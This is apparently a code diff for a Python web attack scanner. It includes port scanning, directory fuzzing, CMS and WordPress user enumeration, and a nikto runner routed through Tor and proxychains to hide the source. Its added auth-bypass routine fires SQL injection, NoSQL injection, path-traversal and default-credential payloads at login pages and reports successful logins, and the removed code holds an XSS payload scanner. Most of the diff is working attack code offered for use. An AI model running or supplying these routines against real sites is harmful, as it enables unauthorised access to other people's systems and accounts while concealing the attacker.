-                if result == 0:
-                    service = "unknown"
-                    try:
-                        service = socket.getservbyport(port)
-                    except:
-                        pass
-                    
-                    banner = ""
-                    try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.settimeout(3)
-                        s.connect((ip, port))
-                        if port in [80, 8080, 443, 8443]:
-                            s.send(b"GET / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
-                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()[:80]
-                        s.close()
-                    except:
-                        pass
-                    
-                    result_queue.put((port, service, banner))
-            except:
-                pass
-    
-    print_info(f"Scanning {len(ports)} ports on {ip}...")
-    
-    thread_list = []
-    for _ in range(threads):
-        t = threading.Thread(target=scan_worker)
-        t.daemon = True
-        t.start()
-        thread_list.append(t)
-    
-    for t in thread_list:
-        t.join(timeout=30)
-    
-    while not result_queue.empty():
-        open_ports.append(result_queue.get())
-    
-    open_ports.sort(key=lambda x: x[0])
-    
-    if open_ports:
-        print_good(f"Found {len(open_ports)} open ports:")
-        print(f"  {'PORT':<8} {'SERVICE':<15} {'BANNER'}")
-        print(f"  {'-'*8} {'-'*15} {'-'*50}")
-        for port, service, banner in open_ports:
-            b = banner.replace('\n', ' ').replace('\r', '')[:50] if banner else ""
-            print(f"  {GREEN}{port:<8}{NC} {service:<15} {b}")
-    else:
-        print_warn("No open ports found")
-    
-    return open_ports
-
-# ============================================================
-# DIRECTORY FUZZING (UNCHANGED)
-# ============================================================
-
-COMMON_DIRS = [
-    "admin", "login", "wp-admin", "administrator", "backup", "backups",
-    "config", "configuration", "css", "js", "images", "img", "uploads",
-    "download", "downloads", "api", "v1", "v2", "graphql", "swagger",
-    "phpmyadmin", "pma", "sql", "database", "db", "test", "tests",
-    "robots.txt", "sitemap.xml", ".git", ".env", "vendor", "node_modules",
-    "assets", "static", "public", "private", "secret", "hidden",
-    "panel", "cpanel", "whm", "server-status", "server-info",
-    "index.php", "index.html", "default.aspx", "web.config",
-    "crossdomain.xml", "clientaccesspolicy.xml", "README.md",
-    "install", "setup", "register", "signup", "forgot", "reset",
-    "profile", "user", "users", "manage", "management",
-    "shell", "cmd", "exec", "console", "terminal", "ssh",
-    "mail", "email", "contact", "about", "help", "status",
-    "search", "results", "ajax", "includes", "classes", "lib",
-    "tmp", "temp", "log", "logs", "error", "errors", "404",
-    "proxy", "proxy.php", "proxy.jsp", "redirect", "out",
-    "cgi-bin", "cgi", "htdocs", "httpdocs", "webdav", "dav"
-]
-
-def fuzz_directories(url):
-    print_section(" Directory Fuzzing ")
-    
-    base_url = f"{url.rstrip('/')}/" if "?" not in url else url.split("?")[0].rstrip("/") + "/"
-    found = []
-    
-    print_info(f"Fuzzing {len(COMMON_DIRS)} common paths...")
-    
-    for directory in COMMON_DIRS:
-        test_url = base_url + directory
+def auto_cms_scan(url):
+    print_section(" CMS Auto Scan ")
+    base_url = f"{url.rstrip('/')}"
+    if "?" in url:
+        base_url = url.split("?")[0].rstrip("/")
+    parsed = urllib.parse.urlparse(url)
+    domain_base = f"{parsed.scheme}://{parsed.netloc}"
+    cms_detected = None
+    cms_info = {}
+    wp_paths = [
+        "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
+        "/wp-json/", "/xmlrpc.php", "/wp-config.php.bak", "/wp-config.php~",
+        "/wp-content/plugins/", "/wp-content/themes/", "/wp-admin/admin-ajax.php",
+        "/readme.html", "/license.txt", "/wp-cron.php", "/wp-links-opml.php"
+    ]
+    joomla_paths = [
+        "/administrator/", "/components/", "/modules/", "/templates/",
+        "/language/", "/plugins/", "/cache/", "/tmp/",
+        "/configuration.php", "/htaccess.txt", "/robots.txt"
+    ]
+    drupal_paths = [
+        "/user/login", "/node/1", "/sites/default/",
+        "/core/", "/modules/", "/themes/",
+        "/CHANGELOG.txt", "/README.txt", "/cron.php"
+    ]
+    print_info("Checking for WordPress...")
+    wp_markers = 0
+    for path in wp_paths:
+        test_url = domain_base + path
         try:
             req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
             resp = urllib.request.urlopen(req, timeout=8)
-            
-            if resp.getcode() in [200, 301, 302, 307, 401, 403]:
-                content_length = len(resp.read())
-                found.append((test_url, resp.getcode(), content_length))
-                
-                if resp.getcode() == 401:
-                    print_warn(f"401 Unauthorized: {test_url} (requires auth)")
-                elif resp.getcode() in [301, 302, 307]:
-                    print_good(f"Redirect ({resp.getcode()}): {test_url}")
-                elif resp.getcode() == 403:
-                    print_warn(f"403 Forbidden: {test_url}")
-                else:
-                    status_color = GREEN if content_length > 100 else YELLOW
-                    print(f"  {status_color}[{resp.getcode()}]{NC} {test_url} ({content_length} bytes)")
-                    
-        except urllib.error.HTTPError as e:
-            if e.code in [401, 403]:
-                print_warn(f"{e.code} {test_url}")
+            if resp.getcode() in [200, 301, 302, 403]:
+                wp_markers += 1
+                if wp_markers >= 2:
+                    cms_detected = "WordPress"
+                    cms_info["version"] = ""
+                    cms_info["paths"] = []
+                    print_good("WordPress CMS detected!")
+                    break
         except:
             continue
-    
-    if found:
-        print_good(f"Found {len(found)} accessible paths")
+    if not cms_detected:
+        print_info("Checking for Joomla...")
+        joomla_markers = 0
+        for path in joomla_paths:
+            try:
+                req = urllib.request.Request(domain_base + path, headers={"User-Agent": get_random_ua()})
+                resp = urllib.request.urlopen(req, timeout=8)
+                if resp.getcode() in [200, 301, 302, 403]:
+                    joomla_markers += 1
+                    if joomla_markers >= 2:
+                        cms_detected = "Joomla"
+                        print_good("Joomla CMS detected!")
+                        break
+            except:
+                continue
+    if not cms_detected:
+        print_info("Checking for Drupal...")
+        drupal_markers = 0
+        for path in drupal_paths:
+            try:
+                req = urllib.request.Request(domain_base + path, headers={"User-Agent": get_random_ua()})
+                resp = urllib.request.urlopen(req, timeout=8)
+                if resp.getcode() in [200, 301, 302, 403]:
+                    drupal_markers += 1
+                    if drupal_markers >= 2:
+                        cms_detected = "Drupal"
+                        print_good("Drupal CMS detected!")
+                        break
+            except:
+                continue
+    if not cms_detected:
+        print_info("No known CMS detected")
+        return None
+    if cms_detected == "WordPress":
+        print_section(" WordPress Auto Scan ")
+        wp_findings = []
+        # Check wp-admin
+        try:
+            req = urllib.request.Request(domain_base + "/wp-admin/", headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=8)
+            if resp.getcode() in [200, 302]:
+                print_good(f"wp-admin accessible: {domain_base}/wp-admin/")
+                wp_findings.append(("Admin Panel", domain_base + "/wp-admin/", "Accessible"))
+        except urllib.error.HTTPError as e:
+            if e.code == 401:
+                print_warn(f"wp-admin requires auth: {domain_base}/wp-admin/")
+                wp_findings.append(("Admin Panel", domain_base + "/wp-admin/", "Auth Required"))
+        # Check XML-RPC
+        try:
+            req = urllib.request.Request(domain_base + "/xmlrpc.php", headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=8)
+            print_warn(f"XML-RPC enabled: {domain_base}/xmlrpc.php")
+            wp_findings.append(("XML-RPC", domain_base + "/xmlrpc.php", "Enabled"))
+        except:
+            pass
+        # Check user enumeration
+        for u_url in [domain_base + "/wp-json/wp/v2/users", domain_base + "/?author=1"]:
+            try:
+                req = urllib.request.Request(u_url, headers={"User-Agent": get_random_ua()})
+                resp = urllib.request.urlopen(req, timeout=8)
+                body = resp.read().decode('utf-8', errors='ignore')
+                if "name" in body and "slug" in body:
+                    print_warn(f"User enumeration possible: {u_url}")
+                    wp_findings.append(("User Enum", u_url, "Possible"))
+                    break
+            except:
+                continue
+        # Check version
+        try:
+            req = urllib.request.Request(domain_base, headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=8)
+            body = resp.read().decode('utf-8', errors='ignore')
+            match = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"', body)
+            if match:
+                print_info(f"WordPress version: {match.group(1)}")
+        except:
+            pass
+        # Check debug.log
+        try:
+            req = urllib.request.Request(domain_base + "/wp-content/debug.log", headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=8)
+            if resp.getcode() == 200:
+                print_warn(f"Debug log exposed: {domain_base}/wp-content/debug.log")
+                wp_findings.append(("Debug Log", domain_base + "/wp-content/debug.log", "Exposed"))
+        except:
+            pass
+    return cms_detected
+
+# ============================================================
+# NIKTO AUTO SCAN
+# ============================================================
+
+def auto_nikto_scan(url):
+    print_section(" Nikto Auto Scan ")
+    nikto_path = shutil.which("nikto")
+    if not nikto_path:
+        print_warn("nikto not found. Install: apt install nikto")
+        return False
+    print_info("Running nikto scan (may take a few minutes)...")
+    cmd = [nikto_path, "-h", url, "-ssl", "-nointeractive", "-Tuning", "123456789"]
+    check_tor_status()
+    check_proxychains()
+    if TOR_RUNNING and PROXYCHAINS_AVAILABLE:
+        cmd = get_proxychains_cmd() + cmd
+        print_good("Routing nikto through Tor + proxychains")
+    try:
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
+        findings = []
+        for line in iter(process.stdout.readline, ""):
+            line = line.strip()
+            if not line:
+                continue
+            if "+" in line and ":" in line:
+                findings.append(line)
+                if "OSVDB" in line or "vulnerabilit" in line.lower() or "CVE" in line:
+                    print_error(f"nikto: {line}")
+                elif "INFO" in line.upper():
+                    print_info(f"nikto: {line}")
+                else:
+                    print_warn(f"nikto: {line}")
+        process.wait()
+        if findings:
+            print_good(f"nikto found {len(findings)} items")
+        else:
+            print_info("nikto completed - no significant findings")
+        return True
+    except Exception as e:
+        print_error(f"nikto failed: {e}")
+        return False
+
+# ============================================================
+# ADMIN PANEL FINDER
+# ============================================================
+
+def find_admin_panel(url):
+    print_section(" Admin Panel Finder ")
+    base_url = f"{url.rstrip('/')}"
+    if "?" in url:
+        base_url = url.split("?")[0].rstrip("/")
+    parsed = urllib.parse.urlparse(url)
+    domain_base = f"{parsed.scheme}://{parsed.netloc}"
+    admin_found = []
+    print_info(f"Searching {len(ADMIN_PATHS)} admin paths...")
+    for path in ADMIN_PATHS:
+        test_url = domain_base + path
+        try:
+            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=6)
+            if resp.getcode() in [200, 301, 302, 401, 403]:
+                body = resp.read().decode('utf-8', errors='ignore')[:500]
+                if resp.getcode() == 200:
+                    if "login" in body.lower() or "password" in body.lower() or "username" in body.lower():
+                        admin_found.append((test_url, "Login Page"))
+                        print_good(f"Admin login found: {test_url}")
+                    elif "dashboard" in body.lower() or "admin" in body.lower():
+                        admin_found.append((test_url, "Dashboard"))
+                        print_good(f"Admin dashboard: {test_url}")
+                    else:
+                        admin_found.append((test_url, f"Accessible (HTTP {resp.getcode()})"))
+                        print_good(f"Admin path: {test_url} (HTTP {resp.getcode()})")
+                elif resp.getcode() in [301, 302]:
+                    admin_found.append((test_url, "Redirect"))
+                    print_good(f"Admin redirect: {test_url}")
+                elif resp.getcode() == 401:
+                    admin_found.append((test_url, "Auth Required"))
+                    print_warn(f"Admin requires auth: {test_url}")
+                elif resp.getcode() == 403:
+                    admin_found.append((test_url, "Forbidden"))
+                    print_warn(f"Admin forbidden: {test_url}")
+        except urllib.error.HTTPError as e:
+            if e.code in [401, 403]:
+                admin_found.append((test_url, f"HTTP {e.code}"))
+        except:
+            continue
+    if admin_found:
+        print_section(" Admin Panel Results ")
+        for url_found, atype in admin_found:
+            print(f"  {GREEN}[{atype}]{NC} {url_found}")
     else:
-        print_info("No accessible paths found")
-    
+        print_warn("No admin panels found")
+    return admin_found
+
+# ============================================================
+# AUTO AUTH BYPASS
+# ============================================================
+
+def auto_auth_bypass(url):
+    print_section(" Auth Bypass Attempts ")
+    parsed = urllib.parse.urlparse(url)
+    domain_base = f"{parsed.scheme}://{parsed.netloc}"
+    login_urls = []
+    for path in ["/admin", "/login", "/wp-login.php", "/administrator",
+                 "/user/login", "/signin", "/auth", "/cms/login"]:
+        test_url = domain_base + path
+        try:
+            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=8)
+            body = resp.read().decode('utf-8', errors='ignore')
+            if "password" in body.lower() or "login" in body.lower() or "username" in body.lower():
+                login_urls.append(test_url)
+        except:
+            continue
+    if not login_urls:
+        login_urls = [url]
+    print_info(f"Testing {len(login_urls)} login pages for auth bypass...")
+    bypass_payloads = [
+        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
+        {"username": "admin' -- -", "password": "anything"},
+        {"username": "admin' #", "password": "anything"},
+        {"username": "' UNION SELECT 1,1,1 -- -", "password": "anything"},
+        {"username": "admin' OR 1=1 -- -", "password": "anything"},
+        {"username": "\" OR \"1\"=\"1", "password": "\" OR \"1\"=\"1"},
+        {"username": "admin", "password": "' OR '1'='1"},
+        {"username": "admin", "password": "admin"},
+        {"username": "admin", "password": "12345"},
+        {"username": "admin", "password": "password"},
+        {"username": "admin", "password": "admin123"},
+        {"username": "root", "password": "root"},
+        {"username": "root", "password": "toor"},
+        {"username": "test", "password": "test"},
+        {"username": "guest", "password": "guest"},
+        {"username": "user", "password": "user"},
+        {"username": "administrator", "password": "administrator"},
+        {"username": '{"$gt": ""}', "password": '{"$gt": ""}'},
+        {"username": '{"$ne": ""}', "password": '{"$ne": ""}'},
+        {"username": "admin", "password": "true"},
+        {"username": "admin", "password": "1"},
+        {"username": "../../../etc/passwd", "password": "anything"},
+    ]
+    for login_url in login_urls:
+        print_info(f"Testing: {login_url}")
+        for payload in bypass_payloads:
+            try:
+                data = urllib.parse.urlencode(payload).encode()
+                req = urllib.request.Request(
+                    login_url, data=data,
+                    headers={"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded"}
+                )
+                resp = urllib.request.urlopen(req, timeout=10)
+                if resp.getcode() == 200:
+                    body = resp.read().decode('utf-8', errors='ignore').lower()
+                    success_indicators = ["dashboard", "welcome", "logout", "logged in", "session", "profile", "admin panel"]
+                    fail_indicators = ["invalid", "incorrect", "wrong", "failed", "error", "try again"]
+                    has_success = any(ind in body for ind in success_indicators)
+                    has_fail = any(ind in body for ind in fail_indicators)
+                    if has_success and not has_fail:
+                        print_good(f"AUTH BYPASS SUCCESSFUL! URL: {login_url}, User: {payload['username']}, Pass: {payload['password']}")
+                        return True, login_url, payload
+            except urllib.error.HTTPError as e:
+                if e.code in [302, 301]:
+                    print_good(f"Auth bypass possible (HTTP {e.code} redirect) - URL: {login_url}")
+                    return True, login_url, payload
+            except:
+                continue
+    print_warn("No auth bypass found")
+    return False, None, None
+
+# ============================================================
+# WEB CRAWLING
+# ============================================================
+
+def web_crawl(url, max_pages=50):
+    print_section(" Web Crawling ")
+    print_info(f"Crawling {url} (max {max_pages} pages)...")
+    visited = set()
+    to_visit = [url]
+    found_urls = []
+    while to_visit and len(visited) < max_pages:
+        current = to_visit.pop(0)
+        if current in visited:
+            continue
+        visited.add(current)
+        try:
+            req = urllib.request.Request(current, headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=10)
+            body = resp.read().decode('utf-8', errors='ignore')
+            found_urls.append(current)
+            print_info(f"Crawled: {current}")
+            links = re.findall(r'href=[\'"]?(/[^\'" >]+)', body)
+            parsed = urllib.parse.urlparse(current)
+            base = f"{parsed.scheme}://{parsed.netloc}"
+            for link in links:
+                if link.startswith('/'):
+                    full_url = base + link
+                elif link.startswith('http'):
+                    full_url = link
+                else:
+                    continue
+                if full_url not in visited and len(visited) < max_pages:
+                    to_visit.append(full_url)
+        except:
+            continue
+    print_good(f"Crawled {len(found_urls)} pages")
+    return found_urls
+
+# ============================================================
+# DIRECTORY FUZZING
+# ============================================================
+
+def fuzz_directories(url):
+    print_section(" Directory Fuzzing ")
+    parsed = urllib.parse.urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    print_info(f"Fuzzing {base} with {len(FUZZ_WORDLIST)} paths...")
+    found = []
+    for path in FUZZ_WORDLIST:
+        test_url = f"{base}/{path}"
+        try:
+            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=5)
+            if resp.getcode() in [200, 301, 302, 403]:
+                found.append((test_url, resp.getcode()))
+                print_good(f"Found: {test_url} (HTTP {resp.getcode()})")
+        except:
+            continue
+    print_good(f"Found {len(found)} directories")
     return found
 
 # ============================================================
-# SSL CHECK (UNCHANGED)
+# PORT SCANNING
 # ============================================================
 
-def check_ssl(url):
-    print_section(" SSL/TLS Check ")
-    
-    domain = extract_domain(url)
-    port = 443
-    
-    try:
-        context = ssl.create_default_context()
-        with socket.create_connection((domain, port), timeout=10) as sock:
-            with context.wrap_socket(sock, server_hostname=domain) as ssock:
-                cert = ssock.getpeercert()
-                cipher = ssock.cipher()
-                
-                print_good(f"SSL/TLS Enabled on {domain}:{port}")
-                print_info(f"Protocol: {ssock.version()}")
-                print_info(f"Cipher: {cipher[0]} ({cipher[1]} bits)")
-                
-                if cert:
-                    subject = dict(x[0] for x in cert['subject'])
-                    issuer = dict(x[0] for x in cert['issuer'])
-                    print_info(f"Subject: {subject.get('commonName', 'N/A')}")
-                    print_info(f"Issuer: {issuer.get('commonName', 'N/A')}")
-                    print_info(f"Valid until: {cert.get('notAfter', 'N/A')}")
-                    
-                    from datetime import datetime as dt2
-                    try:
-                        expiry = dt2.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
-                        days_left = (expiry - dt2.now()).days
-                        if days_left < 0:
-                            print_error(f"Certificate expired {abs(days_left)} days ago!")
-                        elif days_left < 30:
-                            print_warn(f"Certificate expires in {days_left} days")
-                        else:
-                            print_good(f"Certificate valid for {days_left} more days")
-                    except:
-                        pass
-                
-                if cipher[1] < 128:
-                    print_warn(f"Weak cipher strength: {cipher[1]} bits")
-                
-    except ssl.SSLCertVerificationError as e:
-        print_error(f"SSL Certificate verification failed: {str(e)[:60]}")
-    except ssl.SSLError as e:
-        print_error(f"SSL Error: {str(e)[:60]}")
-    except socket.timeout:
-        print_warn("Connection timed out")
-    except Exception as e:
-        print_warn(f"SSL check failed: {str(e)[:60]}")
+def scan_ports(url, ports=None):
+    print_section(" Port Scanning ")
+    if not ports:
+        ports = COMMON_PORTS
+    parsed = urllib.parse.urlparse(url)
+    host = parsed.netloc.split(':')[0] if ':' in parsed.netloc else parsed.netloc
+    print_info(f"Scanning {host} for {len(ports)} common ports...")
+    open_ports = []
+    for port in ports:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            if result == 0:
+                open_ports.append(port)
+                print_good(f"Port {port} open")
+        except:
+            continue
+    print_good(f"Found {len(open_ports)} open ports")
+    return open_ports
 
 # ============================================================
-# HEADER ANALYSIS (UNCHANGED)
+# HEADER ANALYSIS
 # ============================================================
 
 def analyze_headers(url):
     print_section(" Header Analysis ")
-    
     try:
         req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
         resp = urllib.request.urlopen(req, timeout=10)
         headers = dict(resp.headers)
-        
-        print_info("Response Headers:")
-        for k, v in headers.items():
-            print(f"  {CYAN}{k}:{NC} {v}")
-        
-        print()
-        
-        security_headers = {
-            "Strict-Transport-Security": "HSTS enabled (protects against SSL stripping)",
-            "Content-Security-Policy": "CSP enabled (mitigates XSS)",
-            "X-Frame-Options": "Clickjacking protection",
-            "X-Content-Type-Options": "MIME-type sniffing protection",
-            "X-XSS-Protection": "XSS filter (legacy browsers)",
-            "Referrer-Policy": "Referrer leak protection",
-            "Permissions-Policy": "Feature permissions control",
-            "Access-Control-Allow-Origin": "CORS configured"
-        }
-        
-        print_info("Security Header Analysis:")
-        for header, desc in security_headers.items():
-            if header.lower() in [h.lower() for h in headers.keys()]:
-                actual_value = headers.get(header, headers.get(header.lower(), ""))
-                print_good(f"  {header}: {desc} [{actual_value}]")
-            else:
-                print_warn(f"  {header}: MISSING ({desc})")
-        
-        if "Server" in headers:
-            server = headers["Server"]
-            if any(v in server.lower() for v in ["apache", "nginx", "iis", "tomcat"]):
-                print_warn(f"Server info disclosed: {server}")
-            else:
-                print_info(f"Server: {server}")
-        
-        if "X-Powered-By" in headers:
-            print_warn(f"Technology disclosed: X-Powered-By: {headers['X-Powered-By']}")
-        
+        print_info(f"Server: {headers.get('Server', 'Unknown')}")
+        print_info(f"Content-Type: {headers.get('Content-Type', 'Unknown')}")
+        if 'X-Powered-By' in headers:
+            print_info(f"X-Powered-By: {headers['X-Powered-By']}")
+        if 'Set-Cookie' in headers:
+            print_warn("Cookies are being set")
+        if 'X-Frame-Options' not in headers:
+            print_warn("X-Frame-Options header missing - possible clickjacking")
+        if 'X-XSS-Protection' not in headers:
+            print_warn("X-XSS-Protection header missing")
+        if 'Strict-Transport-Security' not in headers:
+            print_warn("HSTS header missing")
+        return headers
     except Exception as e:
-        print_error(f"Header analysis failed: {str(e)[:60]}")
+        print_error(f"Error analyzing headers: {e}")
+        return {}
 
 # ============================================================
-# ROBOTS & SITEMAP (UNCHANGED)
+# SSL/TLS CHECK
 # ============================================================
 
-def check_robots_sitemap(url):
-    print_section(" Robots & Sitemap Analysis ")
-    
-    base = f"{url.rstrip('/')}"
-    if "?" in url:
-        base = url.split("?")[0].rstrip("/")
-    
+def check_ssl(url):
+    print_section(" SSL/TLS Check ")
+    if not url.startswith("https"):
+        print_warn("Target does not use HTTPS")
+        return False
     parsed = urllib.parse.urlparse(url)
-    base_url = f"{parsed.scheme}://{parsed.netloc}"
-    
-    robots_url = f"{base_url}/robots.txt"
+    host = parsed.netloc.split(':')[0] if ':' in parsed.netloc else parsed.netloc
     try:
-        req = urllib.request.Request(robots_url, headers={"User-Agent": get_random_ua()})
-        resp = urllib.request.urlopen(req, timeout=10)
-        body = resp.read().decode('utf-8', errors='ignore')
-        print_good(f"robots.txt found at {robots_url}")
-        print_info("Contents:")
-        for line in body.split('\n'):
-            line = line.strip()
-            if line and not line.startswith('#'):
-                print(f"  {YELLOW}{line}{NC}")
-    except:
-        print_warn("robots.txt not found")
-    
-    sitemap_url = f"{base_url}/sitemap.xml"
-    try:
-        req = urllib.request.Request(sitemap_url, headers={"User-Agent": get_random_ua()})
-        resp = urllib.request.urlopen(req, timeout=10)
-        print_good(f"sitemap.xml found at {sitemap_url}")
-    except:
-        print_warn("sitemap.xml not found")
+        context = ssl.create_default_context()
+        sock = socket.create_connection((host, 443), timeout=10)
+        with context.wrap_socket(sock, server_hostname=host) as ssock:
+            cert = ssock.getpeercert()
+            print_good(f"SSL Certificate found for: {host}")
+            print_info(f"Subject: {cert.get('subject', [])}")
+            print_info(f"Valid from: {cert.get('notBefore', 'Unknown')}")
+            print_info(f"Valid to: {cert.get('notAfter', 'Unknown')}")
+            print_info(f"SSL Version: {ssock.version()}")
+            return True
+    except Exception as e:
+        print_error(f"SSL/TLS check failed: {e}")
+        return False
 
 # ============================================================
-# TECHNOLOGY DETECTION (UNCHANGED)
+# TECHNOLOGY DETECTION
 # ============================================================
 
 def detect_technologies(url):
     print_section(" Technology Detection ")
-    
     techs = []
-    
     try:
         req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
         resp = urllib.request.urlopen(req, timeout=10)
+        body = resp.read().decode('utf-8', errors='ignore')
         headers = dict(resp.headers)
-        body = resp.read().decode('utf-8', errors='ignore').lower()
-        
-        if "Server" in headers:
-            server = headers["Server"]
-            techs.append(f"Server: {server}")
-            print_good(f"Server: {server}")
-            
-            if "cloudflare" in server.lower():
-                techs.append("Cloudflare (CDN/WAF)")
-            if "nginx" in server.lower():
-                techs.append("Nginx")
-            if "apache" in server.lower():
-                techs.append("Apache")
-            if "iis" in server.lower():
-                techs.append("IIS")
-            if "openresty" in server.lower():
-                techs.append("OpenResty")
-        
-        if "X-Powered-By" in headers:
-            techs.append(f"Framework: {headers['X-Powered-By']}")
-            print_good(f"Framework: {headers['X-Powered-By']}")
-        
-        if "Set-Cookie" in headers:
-            cookies = headers["Set-Cookie"]
-            if "PHPSESSID" in cookies:
-                techs.append("PHP")
-                print_good("PHP detected")
-            elif "JSESSIONID" in cookies:
-                techs.append("Java/J2EE")
-                print_good("Java/J2EE detected")
-            elif "ASP.NET" in cookies or "ASPSESSIONID" in cookies:
-                techs.append("ASP.NET")
-                print_good("ASP.NET detected")
-            elif "laravel_session" in cookies:
-                techs.append("Laravel (PHP)")
-                print_good("Laravel detected")
-            elif "ci_session" in cookies:
-                techs.append("CodeIgniter")
-                print_good("CodeIgniter detected")
-            elif "symfony" in cookies:
-                techs.append("Symfony")
-                print_good("Symfony detected")
-            elif "django" in cookies.lower() or "csrftoken" in cookies:
-                techs.append("Django (Python)")
-                print_good("Django detected")
-            elif "rails" in cookies.lower() or "_session" in cookies.lower():
-                techs.append("Ruby on Rails")
-                print_good("Ruby on Rails detected")
-        
-        if "wp-content" in body or "wp-includes" in body or "wordpress" in body:
+        if 'Server' in headers:
+            techs.append(f"Server: {headers['Server']}")
+        if 'X-Powered-By' in headers:
+            techs.append(f"X-Powered-By: {headers['X-Powered-By']}")
+        if 'wp-content' in body or 'wp-admin' in body:
             techs.append("WordPress")
-            print_good("WordPress CMS detected")
-        if "joomla" in body:
+        if 'Joomla' in body or 'joomla' in body:
             techs.append("Joomla")
-            print_good("Joomla CMS detected")
-        if "drupal" in body:
+        if 'Drupal' in body:
             techs.append("Drupal")
-            print_good("Drupal CMS detected")
-        if "shopify" in body:
-            techs.append("Shopify")
-            print_good("Shopify detected")
-        if "magento" in body:
-            techs.append("Magento")
-            print_good("Magento detected")
-        if "csrf-token" in body and "csrf" in body:
-            techs.append("CSRF Protection Present")
-            print_good("CSRF protection detected")
-        if "react" in body or "reactjs" in body or "react.js" in body:
-            techs.append("React JS")
-            print_good("React JS detected")
-        if "angular" in body:
-            techs.append("Angular")
-            print_good("Angular detected")
-        if "vue" in body or "vuejs" in body:
-            techs.append("Vue.js")
-            print_good("Vue.js detected")
-        if "jquery" in body:
+        if 'jQuery' in body:
             techs.append("jQuery")
-            print_good("jQuery detected")
-        if "bootstrap" in body:
+        if 'Bootstrap' in body:
             techs.append("Bootstrap")
-            print_good("Bootstrap detected")
-        
-        if not techs:
-            print_info("No specific technologies identified")
-        
+        if 'react' in body.lower():
+            techs.append("ReactJS")
+        if 'vue' in body.lower():
+            techs.append("VueJS")
+        if 'angular' in body.lower():
+            techs.append("Angular")
+        for tech in techs:
+            print_good(f"Detected: {tech}")
     except Exception as e:
-        print_error(f"Technology detection failed: {str(e)[:60]}")
-    
+        print_error(f"Technology detection failed: {e}")
     return techs
 
 # ============================================================
-# XSS DETECTION (UNCHANGED)
+# ROBOTS/SITEMAP CHECK
 # ============================================================
 
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "'><script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
-    "<ScRiPt>alert(1)</ScRiPt>",
-    "%3Cscript%3Ealert(1)%3C/script%3E",
-    "<script>alert(String.fromCharCode(88,83,83))</script>",
-    "\" autofocus onfocus=alert(1) x=\"",
-    "';alert(String.fromCharCode(88,83,83));//",
-    "\"-alert(1)-\"",
-    "';-alert(1)-'",
-    "<script>prompt(1)</script>",
-    "<script>confirm(1)</script>",
-    "1<script>alert(1)</script>",
-    "<<SCRIPT>alert(1)</SCRIPT>",
-    "<SCRIPT>alert(1);</SCRIPT>",
-    "<scr<script>ipt>alert(1)</scr</script>ipt>"
-]
-
-def xss_scan(url):
-    print_section(" XSS Scan ")
-    
-    if "?" not in url:
-        print_warn("No parameters to test for XSS")
-        return []
-    
-    base_url = url.split("?")[0]
-    params_part = url.split("?")[1]
-    params = params_part.split("&") if params_part else []
-    
-    vulnerable = []
-    
-    for param in params:
-        key = param.split("=")[0] if "=" in param else param
-        print_info(f"Testing parameter: {key}")
-        
-        for payload in XSS_PAYLOADS:
-            test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
-            try:
-                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
-                resp = urllib.request.urlopen(req, timeout=10)
-                body = resp.read().decode('utf-8', errors='ignore')
-                
-                if payload.lower().replace("%3C", "<").replace("%3E", ">").replace("%22", "\"") in body:
-                    vulnerable.append((key, payload))
-                    print_good(f"XSS found in '{key}' with payload: {payload[:40]}")
-                    break
-                    
-            except urllib.error.HTTPError as e:
-                if e.code == 200:
-                    try:
-                        body = e.read().decode('utf-8', errors='ignore')
-                        decoded_payload = payload.replace("%3C", "<").replace("%3E", ">").replace("%22", "\"")
-                        if decoded_payload.lower() in body.lower():
-                            vulnerable.append((key, payload))
-                            break
-                    except:
-                        pass
-            except:
-                continue
-        
-        if not any(v[0] == key for v in vulnerable):
-            print_info(f"Parameter '{key}' appears not vulnerable to XSS")
-    
-    if vulnerable:
-        print_section(" XSS Results ")
-        for v in vulnerable:
-            print_good(f"Parameter: {v[0]}, Payload: {v[1]}")
-    
-    return vulnerable
+def check_robots_sitemap(url):
+    print_section(" Robots & Sitemap Check ")
+    parsed = urllib.parse.urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    for path in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml"]:
+        test_url = base + path
+        try:
+            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
+            resp = urllib.request.urlopen(req, timeout=10)
+            if resp.getcode() == 200:
+                print_good(f"Found: {test_url}")
+                content = resp.read().decode('utf-8', errors='ignore')[:500]
+                print_info(f"Content: {content[:200]}...")
+        except:
+            continue
 
 # ============================================================
-# MODIFIED MAIN SCAN (Added Tor Option)
+# FULLY AUTOMATIC SCAN v2.0
 # ============================================================
 
-def run_full_scan(url):
+def run_auto_scan(url):
     show_banner()
     print()
